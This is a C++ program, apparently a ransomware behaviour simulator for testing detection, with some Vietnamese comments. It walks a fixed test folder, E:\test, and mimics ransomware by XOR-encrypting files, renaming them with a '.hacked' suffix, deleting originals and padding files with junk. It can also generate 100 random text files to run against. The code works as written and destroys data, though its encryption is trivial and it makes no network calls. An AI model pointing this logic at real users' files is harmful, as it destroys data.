// ransomware_simulator.cpp
#include <windows.h>
#include <filesystem>
#include <vector>
#include <string>
#include <random>
#include <iostream>
#include <cstdint>
#include <fstream>

constexpr uint8_t XOR_KEY = 0xFF;
constexpr size_t JUNK_SIZE = 1024; // bytes rác cho test 4
const std::wstring TEST_DIR = L"E:\\test";

// --- Utility: XOR-encrypt buffer in-place ---
void xor_encrypt(std::vector<uint8_t>& buf) {
    for (auto& b : buf) b ^= XOR_KEY;
}

// --- Normal I/O (ReadFile/WriteFile) ---
bool read_normal(const std::wstring& path, std::vector<uint8_t>& out) {
    HANDLE h = CreateFileW(path.c_str(),
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD hi = 0, lo = GetFileSize(h, &hi);
    uint64_t sz = (static_cast<uint64_t>(hi) << 32) | lo;
    out.resize(sz);
    DWORD rd = 0;
    bool ok = ReadFile(h, out.data(), sz, &rd, NULL) && rd == sz;
    CloseHandle(h);
    return ok;
}

bool write_normal(const std::wstring& path,
    const std::vector<uint8_t>& buf,
    bool appendJunk = false) {
    HANDLE h = CreateFileW(path.c_str(),
        GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0;
    if (!WriteFile(h, buf.data(), (DWORD)buf.size(), &wr, NULL) || wr != buf.size()) {
        CloseHandle(h); return false;
    }
    if (appendJunk) {
        std::vector<uint8_t> junk(JUNK_SIZE);
        std::mt19937 gen{ std::random_device{}() };
        std::uniform_int_distribution<short> dis(0, 255);
        for (auto& b : junk) b = dis(gen);
        if (!WriteFile(h, junk.data(), JUNK_SIZE, &wr, NULL) || wr != JUNK_SIZE) {
            CloseHandle(h); return false;
        }
    }
    CloseHandle(h);
    return true;
}

// --- Memory Mapping I/O ---
bool read_mapping(const std::wstring& path, std::vector<uint8_t>& out) {
    HANDLE h = CreateFileW(path.c_str(),
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER fs; GetFileSizeEx(h, &fs);
    HANDLE fm = CreateFileMappingW(h, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!fm) { CloseHandle(h); return false; }
    uint8_t* p = static_cast<uint8_t*>(
        MapViewOfFile(fm, FILE_MAP_READ, 0, 0, 0));
    if (!p) { CloseHandle(fm); CloseHandle(h); return false; }
    out.assign(p, p + fs.QuadPart);
    UnmapViewOfFile(p);
    CloseHandle(fm); CloseHandle(h);
    return true;
}

bool write_mapping(const std::wstring& path,
    const std::vector<uint8_t>& buf,
    bool appendJunk = false) {
    HANDLE h = CreateFileW(path.c_str(),
        GENERIC_READ | GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    uint64_t totalSize = buf.size() + (appendJunk ? JUNK_SIZE : 0);
    HANDLE fm = CreateFileMappingW(h, NULL, PAGE_READWRITE,
        static_cast<DWORD>(totalSize >> 32),
        static_cast<DWORD>(totalSize & 0xFFFFFFFF),
        NULL);
    if (!fm) { CloseHandle(h); return false; }
    uint8_t* p = static_cast<uint8_t*>(
        MapViewOfFile(fm, FILE_MAP_WRITE, 0, 0, totalSize));
    if (!p) { CloseHandle(fm); CloseHandle(h); return false; }
    // ghi nội dung đã xor
    memcpy(p, buf.data(), buf.size());
    if (appendJunk) {
        std::mt19937 gen{ std::random_device{}() };
        std::uniform_int_distribution<short> dis(0, 255);
        for (size_t i = 0; i < JUNK_SIZE; ++i)
            p[buf.size() + i] = dis(gen);
    }
    //FlushViewOfFile(p, totalSize);
    //UnmapViewOfFile(p);
    //CloseHandle(fm); CloseHandle(h);
    return true;
}

// --- 4 hành vi ransomware ---
void test1(const std::wstring& path, bool mapping) {
    std::vector<uint8_t> buf;
    bool ok = mapping
        ? read_mapping(path, buf)
        : read_normal(path, buf);
    if (!ok) { std::wcerr << L"[1] Read error: " << path << L"\n"; return; }
    xor_encrypt(buf);
    ok = mapping
        ? write_mapping(path, buf, false)
        : write_normal(path, buf, false);
    if (!ok) std::wcerr << L"[1] Write error: " << path << L"\n";
}

void test2(const std::wstring& path, bool mapping) {
    test1(path, mapping);
    std::wstring newp = path + L".hacked";
    if (!MoveFileW(path.c_str(), newp.c_str()))
        std::wcerr << L"[2] Rename error: " << path << L"\n";
}

void test3(const std::wstring& path, bool mapping, bool withJunk) {
    std::vector<uint8_t> buf;
    bool ok = mapping
        ? read_mapping(path, buf)
        : read_normal(path, buf);
    if (!ok) { std::wcerr << L"[3/4] Read error: " << path << L"\n"; return; }
    xor_encrypt(buf);
    std::wstring newp = path + L".hacked";
    ok = mapping
        ? write_mapping(newp, buf, withJunk)
        : write_normal(newp, buf, withJunk);
    if (!ok) { std::wcerr << L"[3/4] Write new error: " << newp << L"\n"; return; }
    if (!DeleteFileW(path.c_str()))
        std::wcerr << L"[3/4] Delete error: " << path << L"\n";
}

void test4(const std::wstring& path, bool mapping, bool withJunk) {
    std::vector<uint8_t> buf;
    bool ok = mapping
        ? read_mapping(path, buf)
        : read_normal(path, buf);
    if (!ok) { std::wcerr << L"[3/4] Read error: " << path << L"\n"; return; }
    xor_encrypt(buf);
    std::wstring newp = path + L".hacked";
    ok = mapping
        ? write_mapping(newp, buf)
        : write_normal(newp, buf);
    ok = mapping
        ? write_mapping(path, buf, withJunk)
        : write_normal(path, buf, withJunk);
    if (!ok) { std::wcerr << L"[3/4] Write new error: " << newp << L"\n"; return; }
    if (!DeleteFileW(path.c_str()))
        std::wcerr << L"[3/4] Delete error: " << path << L"\n";
}

void GenerateRandomTextFiles(const std::wstring& directory) {
	std::filesystem::create_directories(directory);

	std::mt19937 rng(std::random_device{}());
	std::uniform_int_distribution<size_t> size_dist(100 * 1024, 1024 * 1024); // 100KB - 1MB
	std::uniform_int_distribution<short> char_dist(0, 51); // Index for A-Z, a-z

	const char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < 100; ++i) {
		std::wstring filename = directory + L"/file_" + std::to_wstring(i) + L".txt";
		size_t file_size = size_dist(rng);

		std::ofstream file(filename, std::ios::binary);
		if (!file.is_open()) {
			std::wcerr << L"Failed to create file: " << filename << L"\n";
			continue;
		}

		for (size_t j = 0; j < file_size; ++j) {
			file.put(alphabet[char_dist(rng)]);
		}

		file.close();
	}
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
		if (argc == 2 && wcscmp(argv[1], L"c") == 0)
		{
			GenerateRandomTextFiles(TEST_DIR);
			return 0;
		}
        std::wcerr << L"Usage: ransomware_simulator.exe <c|m|n> <test#> [...]\n";
        return 1;
    }
    bool mapping = false;
    if (wcscmp(argv[1], L"m") == 0) mapping = true;
    else if (wcscmp(argv[1], L"n") == 0) mapping = false;
    else {
        std::wcerr << L"First arg must be 'm' or 'n'.\n";
        return 1;
    }
    // parse test numbers
    std::vector<int> tests;
    for (int i = 2; i < argc; ++i) {
        int t = _wtoi(argv[i]);
        if (1 <= t && t <= 4) tests.push_back(t);
        else std::wcerr << L"Ignoring invalid test: " << argv[i] << L"\n";
    }
    if (tests.empty()) {
        std::wcerr << L"No valid tests.\n";
        return 1;
    }
    // liệt kê file trong E:\test
    std::vector<std::wstring> files;
    for (auto& e : std::filesystem::recursive_directory_iterator(TEST_DIR)) {
        if (e.is_regular_file())
        {
            files.push_back(e.path().wstring());
        }
    }
    if (files.empty()) {
        std::wcerr << L"No files in " << TEST_DIR << L"\n";
        return 0;
    }
    // thực thi các test
    for (int t : tests) {
        for (auto& f : files) {
            switch (t) {
            case 1: test1(f, mapping); break;
            case 2: test2(f, mapping); break;
            case 3: test3(f, mapping, false); break;
            case 4: test4(f, mapping, true);  break;
            }
        }
    }
    return 0;
}
